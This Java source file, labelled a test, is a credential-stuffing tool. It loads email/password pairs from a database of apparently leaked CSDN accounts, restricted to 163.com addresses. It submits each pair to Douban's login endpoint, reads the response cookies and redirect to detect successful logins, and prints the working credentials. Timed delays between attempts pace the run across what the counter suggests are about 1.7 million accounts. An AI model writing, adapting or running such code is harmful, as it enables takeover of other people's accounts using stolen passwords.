package org.shil.testcsdnetc.etc;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.Consts;
import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.shil.testcsdnetc.db.CsdnAccountDaoImpl;
import org.shil.testcsdnetc.entity.CsdnAccount;

public class DoubanHttpTest {
	
	public static String testDoubanAccountPost(String name, String password){
		
		String responseBody = null;
		CloseableHttpClient httpclient = HttpClients.createDefault();
        try {
        	
        	HttpPost httppost = new HttpPost("https://www.douban.com/accounts/login");
        	List<NameValuePair> params = new ArrayList<NameValuePair>();
        	params.add(new BasicNameValuePair("form_email", name));
        	params.add(new BasicNameValuePair("form_password", password));
        	params.add(new BasicNameValuePair("source", "index_nav"));
        	
        	System.out.println("Executing request " + httppost.getRequestLine());

            // Create a custom response handler
            ResponseHandler<String> responseHandler = new ResponseHandler<String>() {

                @Override
                public String handleResponse(final HttpResponse response) throws ClientProtocolException, IOException {
                	
                	boolean isLoginOk = false;
                	boolean isLocationOk = false;
                	Header[] headers = response.getAllHeaders();
                	for(Header header : headers){
                		System.out.println("in for "+header);
                		if(header.getName().equals("Set-Cookie")){
                			if(!isLoginOk){
                				isLoginOk = header.getValue().contains("ue=") && header.getValue().contains(name);
                			}
                		}else if(header.getName().equals("Location")){
                			isLocationOk = header.getValue().trim().equals("http://www.douban.com");
                		}
                	}
                	System.out.println(isLoginOk);
                	System.out.println(isLocationOk);
                	if(isLocationOk&&isLoginOk){
                		System.out.println("-------test douban account ok----------> " + name + " : "+password);
                	}
            
                	HttpEntity entity = response.getEntity();                        
                	return entity != null ? EntityUtils.toString(entity) : null;
                }
            };
            UrlEncodedFormEntity entity = new UrlEncodedFormEntity(params, Consts.UTF_8);
            httppost.setEntity(entity);
            responseBody = httpclient.execute(httppost, responseHandler);
            
        }catch(Exception e){
        	e.printStackTrace();
        }
        finally {
            try {
				httpclient.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
        }
        
//        System.out.println(responseBody);
        return responseBody;
	}
	
	public static void test163Douban(){

		long offset = 0;
		long pagesize = 34;
		List<CsdnAccount> cas = null;
		do{
			cas =CsdnAccountDaoImpl.listCsdnAccounts("163.com",offset,pagesize);
			offset += pagesize;
			for(CsdnAccount ca : cas){
				
				testDoubanAccountPost(ca.getEmail(),ca.getPassword());
				
				try {
					Thread.sleep(23456);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
			
			System.out.println(offset +"/1736250");
			
			try {
				Thread.sleep(34567);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}while(!cas.isEmpty());
		
	}
	

	public static void main(String[] args){
//		testDoubanAccount("xxx@163.com","yyy");
//		test163Douban();
//		System.out.println("ue=\"xxx@163.com\"; domain=.douban.com; expires=Sat, 12-May-2018 11:17:55 GMT; httponly".contains("ue="));
//		System.out.println("ue=\"xxx@163.com\"; domain=.douban.com; expires=Sat, 12-May-2018 11:17:55 GMT; httponly".contains("xxx@163.com"));
	}
}
